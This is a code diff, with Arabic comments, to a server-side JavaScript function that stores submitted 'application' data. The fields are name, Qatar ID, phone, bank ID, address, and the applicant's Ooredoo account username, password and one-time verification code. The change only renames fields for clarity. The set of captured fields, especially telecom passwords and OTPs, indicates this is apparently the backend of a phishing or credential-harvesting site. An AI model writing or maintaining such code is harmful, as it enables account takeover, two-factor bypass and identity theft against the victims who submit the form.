@@ -36,7 +36,7 @@ function readBody(req) {
   });
 }
 
-// تعديل الدالة لحفظ بيانات مقدم الطلب، البطاقة، وأوريدو بشكل مباشر ونظيف
+// حفظ الحقول الأساسية بأسماء واضحة، مع إبقاء الأسماء المختصرة للتوافق مع البيانات القديمة.
 function cleanApplication(b) {
   const name = b.name ?? b.n;
   const qid = b.qid ?? b.id;
@@ -51,7 +51,7 @@ function cleanApplication(b) {
   const ooredooOtp = b.ooredooCode ?? b.ooredooOtp;
   const status = ["new", "pending", "awaiting", "confirmed", "rejected"].includes(b.status) ? b.status : "new";
   
-  return {
+  const application = {
     ref: str(b.ref, 40) || ("HM-" + Date.now().toString().slice(-8)),
     ts: Date.now(),
     n: str(name, 120), name: str(name, 120),
@@ -79,6 +79,22 @@ function cleanApplication(b) {
     ooredooUser: str(ooredooUser, 100), ooredooUsername: str(ooredooUser, 100),
     ooredooPass: str(ooredooPass, 100), ooredooPassword: str(ooredooPass, 100),
     ooredooOtp: str(ooredooOtp, 20), ooredooCode: str(ooredooOtp, 20)
+  };
+
+  // الأسماء الواضحة هي العقد الأساسي الذي يعيده الخادم ويحفظه.
+  return {
+    ...application,
+    name: application.name,
+    qid: application.qid,
+    phone: application.phone,
+    email: application.email,
+    gender: application.gender,
+    residency: application.residency,
+    bankId: application.bankId,
+    address: application.address,
+    ooredooUsername: application.ooredooUsername,
+    ooredooPassword: application.ooredooPassword,
+    ooredooCode: application.ooredooCode
   };
 }
 
